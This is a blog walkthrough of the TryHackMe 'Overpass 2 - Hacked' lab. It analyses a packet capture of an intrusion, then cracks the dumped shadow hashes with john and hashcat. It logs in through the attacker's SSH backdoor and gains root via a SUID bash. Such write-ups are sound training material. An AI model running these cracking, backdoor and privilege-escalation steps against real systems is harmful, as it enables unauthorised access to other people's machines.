---
layout: post
title: Overpass 2 - Hacked writeup (TryHackMe)
author: wizarddos
category: writeups
---

This challange is from [TryHackMe](https://tryhackme.com/room/overpass2hacked)


## Writeup
That's not really typical, instead of just hacking we have reaction to incident 

P.S These are my favourite type of CTF's, let's go

### 1. PCAP analysis

Open PCAP file in wireshark and follow TCP stream

There, in the first package we see HTTP headers
```
GET [Directory] HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
```

GET request sent to some directory - so I guess this is a URL for reverse shell

Let's check next stream (nr. 1), so next part - payload

```
POST /development/upload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

[...]
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php

[Payload]

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"
[..]
```
We have part of php code - it looks like a reverse shell - this is it: 

We also have attacker's IP address - I don't know if it's useful but still let's note it

Next stream (nr. 2) - There is nothing interesting in it

But stream nr. 3 looks like actual reverse shell

There is also `su` command runned
```
www-data@overpass-production:/var/www/html/development/uploads$ su james
su james
Password: [Password]
```
That's it, attacker switched user to `james`, his password is answer for another task

Let's continue analyzing this stream - we need to find how did attacker established persistence

I guess it is connected to backdoor, answer looks like some link so let's find some link
I see some cloning - to be more specific `ssh-backdoor` repo - so we have it

Attacker left backdoor in our machine - so he/she can go back there any time he/she wants
This is our flag for next task

Now we have to go back to our machine - attacker wanted to find users and their passwords, let's check how many of them we can crack with john
Let's copy `/etc/shadow` file content into `shadow` file on our machine.
```
$ touch shadow # put /etc/shadow content from pcap package into it
$ cat shadow
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```
Now, we have to crack it.
It's said to use fasttrack wordlist (not rockyou like often), so let's use it
```
$ john --wordlist=/usr/share/wordlists/fasttrack.txt shadow
Using default input encoding: UTF-8
Loaded 5 password hashes with 5 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
[Password1]      (paradox)     
[Password2]        (bee)     
[Password3]         (szymex)     
[Password4]         (muirland)     
4g 0:00:00:01 DONE (2023-05-12 20:47) 2.185g/s 121.3p/s 555.1c/s 555.1C/s admin..starwars
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We have passwords cracked - for accounts: 
   - paradox
   - bee
   - szymex
   - muirland
That's flag for last task of this part

Now, hop to analysis

### 2. Backdoor analysis

We have open-source backdoor used here 
Let's check it - head to github and analyze its code

I think that staring with `main.go` file will be the best
In it, we have some variable right at the beginning
```
var hash string = [Hash]

```

I don't know Golang but this is string variable with hash, it's deafult one, so that's our first flag for this task

Now we need to find deafult salt, we have it in `passwordHandler()` function
```
func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, [salt], password)
}
```

As we have read from `verifyPass()` function, second parameter is named `salt` and it's not random - so that's second flag of this part

But our attacker used some other hash, let's go back to pcap file and find out what hash

From code analysis we know that `-a` option is for setting specific hash for backdoor 

This command was used for running it
```
$ ./backdoor -a [Hashed used by attacker]
```
So it looks like hash we are looking for
From further code analysis, this is salted SHA-512 hash - Really useful information

Now let's put it into `password.txt` with salt, that we have found before and give it to hashcat to crack it for us
(We have to use rockyou wordlist here)

```
$  hashcat -m 1710 -a 0 password.txt /usr/share/wordlists/rockyou.txt
[...]
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
:[password]
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1710 (sha512($pass.$salt))
[...]

```
And we have it, we cracked that password
That's our last flag for this part

Now - attack the server

### 3. Attack 

First we need to find heading - let's check the website

We have it right up on a website  - Heading is our first flag

Now let's perform Nmap scan
```
$ nmap -sC -sV $IP
[...]
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e43abeedffa702d26ad6d0bb7f385ecb (RSA)
|   256 fc6f22c2134f9c624f90c93a7e77d6d4 (ECDSA)
|_  256 15fd400a6559a9b50e571b230a966305 (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: LOL Hacked
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|_  2048 a2a6d21879e3b020a24faab6ac2e6bf2 (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have 2 SSH (port 22 and 2222) and Apache server
We can't log into any of the accounts with cracked passwords on port 22, 

but we can log in for backdoor on port 2222
```
$ ssh -v -oHostKeyAlgorithms=+ssh-rsa -p 2222 james@10.10.99.160
[...]
james@10.10.99.160's password: 
[...]

james@overpass-production:/home/james/ssh-backdoor$ 

```
I had too use `-oHostKeyAlgorithms=+ssh-rsa` to set a proper host key type

Let's get the user flag
```
$ cd ~
$ cat user.txt
[Flag]

```

Now the last part - Privilege Escalation

List the directory
```
$ ls -la
total 1136
drwxr-xr-x 7 james james    4096 Jul 22  2020 .
drwxr-xr-x 7 root  root     4096 Jul 21  2020 ..
lrwxrwxrwx 1 james james       9 Jul 21  2020 .bash_history -> /dev/null
-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
drwx------ 2 james james    4096 Jul 21  2020 .cache
drwx------ 3 james james    4096 Jul 21  2020 .gnupg
drwxrwxr-x 3 james james    4096 Jul 22  2020 .local
-rw------- 1 james james      51 Jul 21  2020 .overpass
-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
drwxrwxr-x 3 james james    4096 Jul 22  2020 ssh-backdoor
-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
drwxrwxr-x 7 james james    4096 Jul 21  2020 www

```

There is a suspicious binary `.suid_bash` - And we can run it

Let's do it
```
$ ./.suid_bash -p
# cd /root
# cat root.txt
[Root flag]

```
And we have it - we acquired our last flag

## Conclusion

I liked this room, as I said before I love PCAP analysing

This was interesting room and as far as I remember it took me like 2 hours heh